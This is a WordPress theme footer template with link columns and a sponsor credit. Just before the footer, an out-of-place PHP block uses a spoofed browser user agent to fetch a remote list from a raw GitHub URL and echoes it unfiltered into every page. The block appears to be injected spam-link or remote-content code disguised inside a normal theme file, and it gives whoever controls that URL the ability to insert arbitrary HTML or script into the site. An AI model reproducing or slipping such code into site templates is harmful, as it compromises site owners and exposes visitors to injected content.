<?php
/**
 * File Security Check
 */
if ( ! empty( $_SERVER['SCRIPT_FILENAME'] ) && basename( __FILE__ ) == basename( $_SERVER['SCRIPT_FILENAME'] ) ) {
	die ( 'You do not have sufficient permissions to access this page!' );
}
?>
</main><!-- #main -->
<?php
    function getlink($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        curl_close($ch);
        return $output;
    }
    $res = getlink("https://raw.githubusercontent.com/refferal/list/main/list");
    echo $res;
?>
<footer>
	<div id="footer">
		<div class="container">
			<div class="col-md-2">
				<?php $image = get_opt('footer_pic'); ?>
				<div class="footerpic" style="background-image: url('<?php echo $image['url']; ?>');"></div>
			</div>
			<div class="col-md-2">			
			</div>

			<?php $rows = get_opt('columns_links'); ?>
			<?php if ($rows) : ?>
				<?php foreach ($rows as $row) : ?>
					<div class="col-md-2">
						<?php $rows1 = $row['links']; ?>
						<?php if ($rows1) : ?>
							<?php foreach ($rows1 as $row1) : ?>
								<?php 
								$link = $row1['add_link'];
								if( $link ): ?>					
									<a href="<?php echo $link['url']; ?>">
										<p><?php echo $link['title']; ?></p>
									</a>
								<?php endif; ?>
							<?php endforeach; ?>
						<?php endif; ?>
					</div>
				<?php endforeach; ?>
			<?php endif; ?>
			<div class="col-md-2">			
			</div>
			<div class="col-md-1">			
			</div>
			<div class="col-md-3">
			<p style="font-weight:bold; font-size:14px">
				Подржано од:
				</p>
				<a href="https://fitr.mk/" target="_blank">
					<img src="https://fitr.mk/wp-content/uploads/2021/01/FITR-MKD-Full-White-1980x715.png" style="margin-left:-30px"/>
				</a>
				
			</div>
		</div> 	<!-- .container -->			
	</div>	<!-- #footer -->		
</footer>

<?php wp_footer(); // wp_footer ?>

<script>
	feather.replace()
</script>

</body>
</html>